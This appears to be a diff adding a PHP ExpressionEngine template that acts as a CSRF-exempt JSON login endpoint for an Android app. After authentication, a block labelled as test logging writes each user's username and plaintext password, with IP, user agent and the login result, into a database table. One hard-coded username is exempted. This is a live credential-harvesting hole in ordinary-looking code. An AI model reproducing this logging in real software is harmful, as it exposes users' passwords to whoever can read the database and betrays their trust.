@@ -1,0 +1,62 @@
+<?php
+ee()->functions->form_declaration(array(
+  'action'  => 'csrf_exempt',
+  'secure'  => FALSE
+));
+// Fetch the member from the DB using whatever logic you need
+if(ee()->uri->segment(3) == "xid") {
+    echo json_encode(array("xid"=>"{XID_HASH}"));
+    return;
+}
+$this->EE->load->library('auth');
+
+//parse_str(file_get_contents( 'php://input', 'r' ),$post_vars);
+$username = ee()->input->post('username');
+$password = ee()->input->post('password');
+
+$loggedin = false;
+$result = "failed";
+
+if(!empty($username) && !empty($password)) {
+    $loggedin = $this->EE->auth->authenticate_username($username, $password);
+}
+
+if(!$loggedin) {
+    echo json_encode(array("status"=>"error", "msg"=>"Invalid Username and/or Password"));
+} else {
+    $result = "passed";
+    $loggedin->remember_me();
+    $loggedin->start_session();
+    //$ee->session->sess_expiration = 30;
+    echo json_encode(array("status"=>"success", "member_id"=>ee()->session->userdata('member_id'), "email"=>ee()->session->userdata('username'), "session_id"=>ee()->session->userdata('fingerprint')));
+}
+
+// log it for testing
+            // change table prefix to air_
+if($username != "eiles") {
+    $dbprefix = $this->EE->db->dbprefix;  // save current prefix
+    $this->EE->db->dbprefix = 'air_';
+    $this->EE->db->insert(
+        'posted',
+        array(
+            'page' => $this->EE->uri->uri_string(),
+						'ip' => ee()->session->userdata('ip_address'),
+            'user_agent' => ee()->session->userdata('user_agent'),
+            'misc' => "Android - " . $username." / ".$password." .. ".$result
+        )
+    );  
+    // put prefix back to what it was
+    $this->EE->db->dbprefix = $dbprefix; 
+}
+//
+
+/*$this->EE->load->library('auth');
+
+// Load a new Auth_result object which logs in the member
+$authed = new Auth_result($member->row());
+$authed->start_session($cp_session = FALSE);
+
+$member->free_result();*/
+?>
+
+{exp:http_header content_type="application/json"}
